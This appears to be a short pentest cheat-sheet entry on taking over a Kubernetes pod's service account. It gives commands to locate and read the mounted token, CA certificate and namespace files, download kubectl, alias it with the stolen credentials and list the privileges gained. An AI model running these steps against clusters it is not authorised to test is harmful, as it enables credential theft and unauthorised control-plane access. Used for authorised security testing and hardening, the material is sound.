# Pod service account takeover

**Description:** This entry describes how to use serviceaccount details that are mounted into a pod to run command on the control plane API

**Requirements:** kubectl

## Pod service accounts

```
mount | grep kube
```

Searching for the serviceaccount folder (Default: /run/secrets/kubernetes.io/serviceaccount)

Important files:
* ca.crt
* namespace
* token (service account token)

```
env

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=nginx-6799fc88d8-2pgh2
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
NGINX_VERSION=1.19.6
NJS_VERSION=0.5.0
PKG_RELEASE=1~buster
HOME=/root

```

Search environment variables for api endpoints

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

Downloading a copy of [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/) (chmod u+x before running)

```
alias kubectl="<path_to_kubectl> --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://<api_server_ip>:<api_server_port>"
```

Setup kubectl command with discovered credentials from serviceaccount folder

```
kubectl auth can-i --list
```

List all privileges with current context

## References
* [Kubectl - Reference Docs](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands)
* [Kubernetes docs - access api from pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)
